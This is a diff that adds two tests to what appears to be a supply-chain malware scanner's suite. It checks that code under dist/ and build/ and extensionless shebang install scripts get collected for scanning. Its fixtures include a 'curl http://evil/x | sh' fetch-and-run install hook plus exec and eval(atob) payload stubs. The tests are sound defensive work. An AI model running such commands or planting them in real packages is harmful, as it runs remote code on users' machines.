@@ -222,6 +222,45 @@ test("a very large file (past the scan-slice ceiling) is head+tail sliced so pay
   assert.ok(scanned.includes("scan-truncated"), "expected a visible truncation marker");
 });
 
+test("scans code shipped under dist/ and build/ — a published tarball's real runtime code is not skipped as build output", async () => {
+  const root = await fs.mkdtemp(path.join(os.tmpdir(), "sca-dist-"));
+  // Ubiquitous published-package shape: main points into dist/, and the only
+  // real code lives under dist/ (and build/). If those dirs are skipped the
+  // heuristic layer never sees the code that actually runs.
+  await fs.writeFile(
+    path.join(root, "package.json"),
+    JSON.stringify({ name: "victim", version: "1.0.0", main: "dist/index.js" })
+  );
+  await fs.mkdir(path.join(root, "dist"));
+  await fs.writeFile(path.join(root, "dist", "index.js"), "const cp=require('child_process');cp.execSync('id');");
+  await fs.mkdir(path.join(root, "build"));
+  await fs.writeFile(path.join(root, "build", "payload.js"), "eval(atob('x'));");
+  // node_modules / coverage must STILL be skipped (genuine non-shipped noise).
+  await fs.mkdir(path.join(root, "node_modules"));
+  await fs.writeFile(path.join(root, "node_modules", "dep.js"), "// vendored");
+
+  const sourceFiles = await collectSourceFiles(root);
+  const keys = Object.keys(sourceFiles);
+  assert.ok(keys.some((k) => k.replace(/\\/g, "/") === "dist/index.js"), "dist/ code must be scanned");
+  assert.ok(keys.some((k) => k.replace(/\\/g, "/") === "build/payload.js"), "build/ code must be scanned");
+  assert.ok(!keys.some((k) => k.includes("node_modules")), "node_modules must still be skipped");
+});
+
+test("collects an extensionless shebang script (bare install hook) but not a plain extensionless data file", async () => {
+  const root = await fs.mkdtemp(path.join(os.tmpdir(), "sca-shebang-"));
+  // A bare `install` shell script wired into a lifecycle hook has no text
+  // extension, so the extension allow-list would skip it — the shebang rescues it.
+  await fs.writeFile(path.join(root, "install"), "#!/bin/sh\ncurl http://evil/x | sh\n");
+  // An extensionless data file with no shebang stays out (not executable code).
+  await fs.writeFile(path.join(root, "notes"), "plain notes, no shebang here\n");
+
+  const sourceFiles = await collectSourceFiles(root);
+  const keys = Object.keys(sourceFiles);
+  assert.ok(keys.includes("install"), "extensionless shebang script must be scanned");
+  assert.ok(sourceFiles["install"].includes("curl http://evil"), "script body must reach the scanner");
+  assert.ok(!keys.includes("notes"), "extensionless non-script data file must stay skipped");
+});
+
 // --- Finding 2: tar listing validator — hardlinks, newline names, fail-closed
 //
 // The security decisions live in validateTarListing / parseTarListingLine /
